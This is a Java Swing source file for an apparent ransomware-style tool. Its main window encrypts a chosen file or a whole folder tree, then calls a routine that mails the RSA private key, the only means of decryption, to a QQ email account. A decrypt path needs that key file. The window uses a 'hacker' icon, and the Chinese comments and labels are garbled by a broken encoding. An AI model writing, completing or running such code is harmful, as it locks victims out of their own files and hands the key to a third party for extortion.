package com.encrypt;

import java.awt.Color;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.spec.InvalidKeySpecException;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.mail.MessagingException;
import javax.mail.internet.AddressException;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFileChooser;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JProgressBar;

import com.fileoperate.DecryptAllFiles;
import com.fileoperate.EncryptAllFiles;
import com.utils.ComputeProcess;
import com.utils.Utils;

/*
 * ������
 */
public class MainWindow implements ActionListener{
	
	private File rsaPrivateKeyFile = null;
	private int screenWidth = Toolkit.getDefaultToolkit().getScreenSize().width;
	private int screenHeight = Toolkit.getDefaultToolkit().getScreenSize().height;
	private int windowWidth = 600;
	private int windowHeight = 600;
	private JProgressBar progressBar = null;//������
	private JLabel currentSpeed = null;
	private JLabel remainTime = null;
	private JLabel remainSize = null;
	private ComputeProcess computeProcess = new ComputeProcess();
	public MainWindow()
	{
		JFrame frame = new JFrame("���Լ��ܱ�");
		JPanel panel = new JPanel();
		frame.add(panel);
		
		JButton encryptBtn = new JButton("�����ļ�");
		encryptBtn.setActionCommand("encryptBtn");
		encryptBtn.addActionListener(this);
		panel.add(encryptBtn);
		JButton decryptBtn = new JButton("�����ļ�");
		decryptBtn.setActionCommand("decryptBtn");
		decryptBtn.addActionListener(this);
		panel.add(decryptBtn);
		JButton rsaKeyBtn = new JButton("RSA˽Կ�ļ�");
		rsaKeyBtn.setActionCommand("rsaKeyBtn");
		rsaKeyBtn.addActionListener(this);
		panel.add(rsaKeyBtn);
		
		progressBar = new JProgressBar();
		progressBar.setBackground(Color.BLACK);//������������ɫ
		progressBar.setForeground(Color.RED);//��������ɫ
		progressBar.setStringPainted(true);//��������ʾ����
		panel.add(progressBar);
		
		remainTime = new JLabel();
		double remaintime = 0.0;
		remainTime.setText("Ԥ��ʣ��ʱ��:" + remaintime);
		panel.add(remainTime);
		
		currentSpeed = new JLabel();
		double currentspeed = 0.0;
		currentSpeed.setText("��ǰ�ٶ�:" + currentspeed);
		panel.add(currentSpeed);
		
		remainSize = new JLabel();
		double remainsize = 0.0;
		remainSize.setText("��ǰ�������:" + remainsize);
		panel.add(remainSize);
		
		//frame.setSize(windowWidth, windowHeight);
		frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		frame.setVisible(true);
		frame.setBounds((screenWidth-windowWidth)/2, (screenHeight-windowHeight)/2, 
				windowWidth, windowHeight);
		
		ImageIcon imageIcon = new ImageIcon(getClass().getResource("/images/hacker.jpg"));
		frame.setIconImage(imageIcon.getImage());
		
	
		//frame.setLocation((screenWidth-windowWidth)/2, (screenHeight-windowHeight)/2);
		
		panel.setBackground(Color.PINK);
		
	}

	public void init()
	{
		this.computeProcess.setProgressBar(this.progressBar);
		this.computeProcess.setCurrentSpeed(this.currentSpeed);
		this.computeProcess.setRemainSize(this.remainSize);
		this.computeProcess.setRemainTime(this.remainTime);
	}
	public static void main(String[] args) {
		 new MainWindow().init();;
	}

	@Override
	public void actionPerformed(ActionEvent e) {
		/*
		new Thread()
    	{
    		public void run()
    		{
    			for(int i=0;i<101;i++)
    			{
    				try {
						Thread.sleep(5000);
					} catch (InterruptedException e) {
						e.printStackTrace();
					}
    				progressBar.setValue(i);
    			}
    			progressBar.setString("�������");
    		}
    	}.start();
		*/
		
		
		
	   if(e.getActionCommand() == "decryptBtn")
	   {
		   if(this.rsaPrivateKeyFile == null)
		   {
			   System.out.println("��û��ѡ��RSA˽Կ�ļ����޷�����");
			   return ;
		   }
	   }
	   JFileChooser fileChooser = new JFileChooser();
	   fileChooser.setFileSelectionMode(JFileChooser.FILES_AND_DIRECTORIES);
	   fileChooser.showDialog(new JLabel(), "ѡ���ļ�");
	   File file = fileChooser.getSelectedFile();
	   if(e.getActionCommand() == "encryptBtn")
	   {
		   this.computeProcess.setSourceFile(file);
		   this.computeProcess.init();
		   Thread encryptThread = new Thread(this.computeProcess);
		   encryptThread.start();//��ʼ�������
		  
		   if(file.isDirectory())
		    {
		    	System.out.println("�����ļ���:" + file.getAbsolutePath());
		    	//ѭ�������ļ��м��ܣ����ļ���ͬ��Ŀ¼�²�����Կ�ļ�
		    	EncryptAllFiles encryptAllFiles = new EncryptAllFiles();
		    	encryptAllFiles.breadthFirstTraver(file.getAbsolutePath());
		    	System.out.println("������ȱ������ܣ���������" + encryptAllFiles.getBreadthFolderNum()
						+ "���ļ���;" + encryptAllFiles.getBreadthFileNum() + "���ļ�.");
		    }else if(file.isFile())
		    {
		    	System.out.println("�����ļ�:" + file.getAbsolutePath());
		    	//ֻ���ܵ����ļ�
		    	EncryptAllFiles encryptFile = new EncryptAllFiles();
		    	encryptFile.doSomeThings(file);
		    }
		    System.out.println(file.getName());
		    //���������ʾ��
		    try {
				Utils.playRemindSound();
			} catch (IOException e2) {
				e2.printStackTrace();
			}
		    //��RSA��Կ�ļ����͵�QQ����
			RSAEncryptAES rsaEncrypt = RSAEncryptAES.getRSAEncryptAES();
			try {
			   rsaEncrypt.sendRSAPrivateKeyToQQMail();
			} catch (IOException | MessagingException e1) {
				e1.printStackTrace();
			}
		   
	   }else if(e.getActionCommand() == "decryptBtn")
	   {
		   if(file.isDirectory())
		    {
		    	System.out.println("�����ļ���:" + file.getAbsolutePath());
		    	//����ͬ��Ŀ¼�µ���Կ�ļ�ѭ�������ļ��в����а����ļ�����
		    	DecryptAllFiles decryptAllFiles = new DecryptAllFiles();
		    	DecryptFileTest decryptFileTest = DecryptFileTest.getDecryptFileTest();
		    	try {
					decryptFileTest.initRSAPrivateKey(this.rsaPrivateKeyFile);
				} catch (ClassNotFoundException | IOException e1) {
					e1.printStackTrace();
				}
		    	decryptAllFiles.breadthFirstTraver(file.getAbsolutePath());
				System.out.println("������ȱ������ܣ���������" + decryptAllFiles.getBreadthFolderNum() 
						+ "���ļ���;" + decryptAllFiles.getBreadthFileNum() + "���ļ�.");
		    	
		    }else if(file.isFile())
		    {
		    	System.out.println("�����ļ�:" + file.getAbsolutePath());
		    	//ֻ���ܵ����ļ�
		    	DecryptAllFiles decryptFile = new DecryptAllFiles();
		    	DecryptFileTest decryptFileTest = DecryptFileTest.getDecryptFileTest();
		    	try {
					decryptFileTest.initRSAPrivateKey(this.rsaPrivateKeyFile);
				} catch (ClassNotFoundException | IOException e1) {
					e1.printStackTrace();
				}
		    	decryptFile.doSomeThings(file);
		    }
		    System.out.println(file.getName());
		    //���������ʾ��
		    try {
				Utils.playRemindSound();
			} catch (IOException e1) {
				e1.printStackTrace();
			}
		   
	   }else if(e.getActionCommand() == "rsaKeyBtn")
	   {
		   if(file.isDirectory())
		    {
		    	System.out.println("�ļ���:" + file.getAbsolutePath());
		    	//��ʾ��Կ���ļ��������ļ���
		    	
		    }else if(file.isFile())
		    {
		    	System.out.println("�ļ�:" + file.getAbsolutePath());
		    	//ѡ������Կ�ļ�,�ж���Կ�ļ��ĸ�ʽ
		    	String filename = file.getName();
		    	if(filename.lastIndexOf("RSAPrivateSerialize") != -1)
		    	{
		    		this.rsaPrivateKeyFile = file;
		    		return ;
		    	}else{
		    		System.out.println("���ļ�������Ч��RSA˽Կ�ļ���");
		    		return ;
		    	}
		    }
		    System.out.println(file.getName());
		   
	   }
	}
	
}
